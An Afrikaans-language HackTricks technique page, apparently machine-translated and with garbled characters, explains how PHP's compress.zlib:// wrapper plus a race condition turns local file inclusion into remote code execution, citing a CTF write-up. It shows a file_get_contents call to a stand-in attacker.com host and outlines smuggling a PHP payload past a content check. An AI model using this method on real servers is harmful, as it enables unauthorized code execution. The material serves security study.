<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>


## `compress.zlib://` en `PHP_STREAM_PREFER_STDIO`

'n L√™er wat geopen word met die protokol `compress.zlib://` met die vlag `PHP_STREAM_PREFER_STDIO` kan voortgaan om data wat later by die verbinding aankom, na dieselfde l√™er te skryf.

Dit beteken dat 'n oproep soos:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Sal stuur 'n versoek om http://attacker.com/file, dan kan die bediener die versoek beantwoord met 'n geldige HTTP-antwoord, die verbinding oop hou en later ekstra data stuur wat ook in die l√™er geskryf sal word.

Jy kan daardie inligting sien in hierdie deel van die php-src-kode in main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
## Race Voorwaarde tot RCE

[**Hierdie CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) is opgelos deur gebruik te maak van die vorige truuk.

Die aanvaller sal die **slagofferbediener dwing om 'n verbinding oop te maak en 'n l√™er van die aanvaller se bediener te lees** deur gebruik te maak van die **`compress.zlib`** protokol.

**Terwyl** hierdie **verbinding** bestaan, sal die aanvaller die pad na die tydelike l√™er wat geskep is, **uitlek** (dit word deur die bediener uitgelek).

**Terwyl** die **verbinding** nog oop is, sal die aanvaller 'n LFI uitbuit deur die tydelike l√™er te laai wat hy beheer.

Daar is egter 'n kontrole in die webbediener wat verhoed dat l√™ers gelaai word wat `<?` bevat. Daarom sal die aanvaller 'n **Race Voorwaarde** misbruik. In die verbinding wat nog oop is, sal die **aanvaller** die PHP-payload **NA** die **webbediener** stuur het **gekontroleer** of die l√™er die verbode karakters bevat, maar **VOORDAT dit sy inhoud laai**.

Vir meer inligting, kyk na die beskrywing van die Race Voorwaarde en die CTF by [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
